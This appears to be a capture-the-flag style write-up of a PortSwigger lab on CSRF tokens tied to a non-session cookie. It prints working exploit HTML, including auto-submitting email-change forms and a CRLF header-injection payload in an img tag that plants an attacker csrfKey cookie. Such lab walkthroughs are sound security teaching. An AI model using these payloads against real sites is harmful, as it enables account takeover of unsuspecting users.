# Lab: CSRF where token is tied to non-session cookie
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- wiener:peter
- carlos:montoya

# Solution
Start by logging in with the wiener user to get access to the email form. And as we can see the form has a CSRF token hidden inside the change email form.  
![](Lab_5_Change_mail_form_HTML.png)


There is also an cookie sent with the request from the client.  
![](Lab_5_CSRF_cookie.png)


Doing a request to change the mail to see what the change mail request looks like.  
![](Lab_5_Change_email_req.png)


So there are two CSRF tokens sent in the request, one stored in a cookie and one hidden in the form on the page. We have access to another account, let's login to see if we can steal the tokens of that account to change the email of the wiener account.  


Getting carlos tokens. 
![](Lab_5_Carlos_tokens.png)


Both tokens are needed, else we get the "Invalid CSRF token" error show here.  
![](Lab_5_Invalid_token_error.png)



But by entering both "stolen" tokens as a cookie and in the body we get the app to change our email. Now we now that the tokens aren't tied to a specific user session and that two tokens are needed, one being set as a cookie and one hidden in the form like in previously completed labs. With this knowledge we can start creating our exploit.   
```html
<html>
<body>
    <form class="login-form" name="change-email-form" action="https://0a960064042243f080832b8e0059007d.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="evil@pwned.com">
        <input required type=hidden name=csrf value=N5h6mhGXE5nIGdgNNjilux7ow2R4TJSe>
        <button class='button' type='submit'> Update email </button>
    </form>
		<script>
			document.forms[0].submit()
		</script>
</body>
</html>
```


Now we need to find a way to get the server to set a cookie in the client that contains our attacker token (from the wiener account).

After exploring the page it was noticed that a cookie is set when using the search function on the "Home" page containing the string from the search field. This tells us that user input is used to set the value of the cookie.   
![](Lab_5_Search_cookie.png)


Testing this further proves that making a get request to "/" with a "search" query set a cookie with a value of what ever we enter into the parameter. We need to set an additional cookie with our attacker token.    
![](Lab_5_Set_cookie_with_search.png)


Researching URL encoding i found that:
- ```%0d``` is the action to "Carrige Return"
- ```%0a``` is the action for "Line Feed"
These actions are used create a new line in the HTTP header, CRLF.
So adding a semi-colon ";" to break out from the "Set-Cookie" header and adding ```%0d%0a``` to the query will create a new line in the HTTP header, like this:  
![](Lab_5_Setting_our_own_cookie.png)


So now we only need to make our exploit to create a GET request with ```/search``` query containing our value to create a new line to set a cookie. For this can we use a img tag. And because we need to make the request to set our cookie first, before posting the form for changing the email we can use the onerror attribute on the img tag to execute the JavaScript when the img tag fails to load an image.  
```html 
<html>
<body>
    <form class="login-form" name="change-email-form" action="https://0a960064042243f080832b8e0059007d.web-security-academy.net/my-account/change-email" method="POST">
        <label>Email</label>
        <input required type="email" name="email" value="evilner@pwned.com">
        <input required type=hidden name=csrf value="NbSDcezTKEkhFRmNrqpL5GcDq2GHrATd">
        <button class='button' type='submit'> Update email </button>
    </form>
    <img src="https://0a960064042243f080832b8e0059007d.web-security-academy.net/?search=123%3b%0d%0aSet-Cookie:%20csrfKey=lLto51zgFsJHz7q6LUtbpbI40kfAF7xd%3b%20SameSite=None" onerror="document.forms[0].submit()"
</body>
</html>
```



![](Lab_5_Solved.png)